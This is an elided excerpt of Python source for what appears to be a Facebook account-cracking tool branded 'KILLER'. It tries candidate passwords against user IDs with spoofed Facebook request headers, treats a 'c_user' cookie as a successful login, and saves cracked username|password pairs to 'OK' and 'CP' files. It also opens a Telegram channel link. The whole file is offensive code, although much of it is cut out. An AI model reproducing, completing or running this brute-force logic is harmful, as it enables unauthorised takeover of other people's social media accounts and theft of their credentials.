...
def killer():
    ...
    if _killer___ in ('1', '01'):
        __xxx__().killerx(id)
    os.system("xdg-open https://t.me/𝐊𝐈𝐋𝐋𝐄𝐑 ")
class __xxx__:
    def __init__(self):
        self.id = []
    def killerx(self,id):
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;92m[𝐊𝐈𝐋𝐋𝐄𝐑] \x1b[1;94m{loop}|\x1b[1;95m{len(self.id)} \x1b[1;92mOK/\x1b[1;91mCP \x1b[1;92m{len(ok)}\x1b[1;96m/\x1b[1;91m{len(cp)}")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                header = {
                    ...
                    'x-fb-request-id': 'A0B1347LHdRho_PtXHBKLaG',
                    'x-fb-trace-id': 'BSkycI/11n6',
                    'x-fb-rev': '1008025605',
                    'x-fb-debug': 'OGmLja/ozZCZkwqcnaGJsQa78hP5PxjZWmjws6joGTFrLDwlhPwhl1bgCXhua/LE5WuXIHdpoopd0JfaO+D5ug==',
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [𝐊𝐈𝐋𝐋𝐄𝐑 - 𝐎𝐊 ☻︎] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('𝐊𝐈𝐋𝐋𝐄𝐑_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [𝐊𝐈𝐋𝐋𝐄𝐑 - 𝐂𝐏 ☹︎] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('ᕼᗩᗰᗩ_CP.txt' , 'a').write('%s\n' % wrt)
                        break
